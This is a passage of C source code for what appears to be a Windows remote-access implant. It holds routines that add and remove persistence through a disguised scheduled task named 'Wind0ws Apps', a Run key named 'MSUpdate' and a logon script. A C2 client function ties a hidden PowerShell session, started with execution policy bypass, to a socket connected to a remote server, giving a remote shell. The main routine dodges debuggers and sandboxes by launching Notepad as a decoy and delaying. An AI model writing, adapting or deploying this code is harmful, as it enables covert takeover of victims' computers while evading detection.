            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key.\n");
        }
    }
    else if (!strcmp(option, "schtask"))  {
        if (isElevated == 0) {
            printf("You need to be elevated to add to task scheduler.\n");
            return;
        }
        char command[500];
        char username[256];
        DWORD username_len = sizeof(username);
        GetUserNameA(username, &username_len);
        snprintf(command, sizeof(command), "schtasks /create /tn \"Wind0ws Apps\" /tr \"%s\" /sc onlogon /ru %s /F", BIN_PATH, username);
        int res = system(command);
        if (res == 0) {
            printf("Added to task scheduler.\n");
        } else {
            printf("Failed to add to task scheduler. system() returned error code : %d\n", res);
        }
    }
}

void setup_storagepath() {
    if (!(SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, STORE_PATH)))) {
        strcat(STORE_PATH, "\\.Wind0wsApp");
        if (GetFileAttributesA(STORE_PATH) == INVALID_FILE_ATTRIBUTES) {
            CreateDirectoryA(STORE_PATH, NULL);
        }
    }
    else {
        GetModuleFileNameA(NULL, BIN_PATH, MAX_PATH);
        GetModuleFileNameA(NULL, STORE_PATH, MAX_PATH);
        char* last_slash = strrchr(STORE_PATH, '\\');
        *last_slash = '\0';
    }
}

void remove_storagepath() {
    if (GetFileAttributesA(STORE_PATH) != INVALID_FILE_ATTRIBUTES) {
        RemoveDirectoryA(STORE_PATH);
    }
}

void remove_persistence(char* option) {
    if (!strcmp(option, "startup")) {
        char command[400];
        snprintf(command, sizeof(command), "del \"%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe\"");
        int res = system(command);
        if (res == 0) {
            printf("Removed from startup.\n");
        } else {
            printf("Failed to remove from startup.\n");
        }
    } else if (!strcmp(option, "registry")) {
        HKEY hkey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);        
        if (result == ERROR_SUCCESS) {
            result = RegDeleteValueA(hkey, "MSUpdate");
            if (result == ERROR_SUCCESS) {
                printf("Removed from registry.\n");
            } else {
                printf("Failed to remove from registry. Error code : %ld\n", result);
            }
            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key. Error code : %ld\n", result);
        }
    } else if (!strcmp(option,"logon")) {
        HKEY hkey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hkey);
        if (result == ERROR_SUCCESS) {
            result = RegDeleteValueA(hkey, "UserInitMprLogonScript");
            if (result == ERROR_SUCCESS) {
                printf("Removed from registry.\n");
            } else {
                printf("Failed to remove from registry. Error code : %ld\n", result);
            }
            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key. Error code : %ld\n", result);
        }
    } else if (!strcmp(option, "schtask"))  {
        char command[500];
        snprintf(command, sizeof(command), "schtasks /delete /tn \"Wind0ws Apps\" /f");
        int res = system(command);
        if (res == 0) {
            printf("Removed from task scheduler\n");
        } else {
            printf("Failed to remove from task scheduler. system() returned error code : %d\n", res);
        }
    }
}

void start_c2_client() {
    WSADATA wsaData;
    SOCKET client_socket;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Failed to initialize Winsock. Error Code : %d\n", WSAGetLastError());
        return;
    }
    create_socket(&client_socket);
    connect_to_server(client_socket);
    HANDLE hStdinRead, hStdinWrite;
    HANDLE hStdoutRead, hStdoutWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) {
        fprintf(stderr, "Error creating stdin pipe.\n");
        return;
    }
    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
        fprintf(stderr, "Error creating stdout pipe.\n");
        CloseHandle(hStdinRead);
        CloseHandle(hStdinWrite);
        return;
    }
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;
    if (!CreateProcess( 
            NULL,                  
            "powershell.exe -NoLogo -ep bypass",     
            NULL,                  
            NULL,                   
            TRUE,                  
            0,                      
            NULL,                   
            NULL,                   
            &si,                    
            &pi)) {                
        fprintf(stderr, "Error creating process.\n");
        CloseHandle(hStdinRead);
        CloseHandle(hStdinWrite);
        CloseHandle(hStdoutRead);
        CloseHandle(hStdoutWrite);
        return;
    }
    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);
    receive_commands(client_socket, hStdoutRead, hStdinWrite);
    WSACleanup();
}

void benignProcess() {
    STARTUPINFO si = { sizeof(STARTUPINFO) }; 
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) { // Create notepad.exe process using CreateProcess
        fprintf(stderr, "Error creating process\n");
        return;
    }
    // Wait for the process to exit
    // WaitForSingleObject(pi.hProcess, INFINITE);
}

int main() {
    if (IsDebugged()) {
        benignProcess();
    }
     if (sandboxCheck()) {
        benignProcess();
        Sleep(1000*60*10);
    }
    setup_storagepath();
    start_c2_client();
    return EXIT_SUCCESS;
}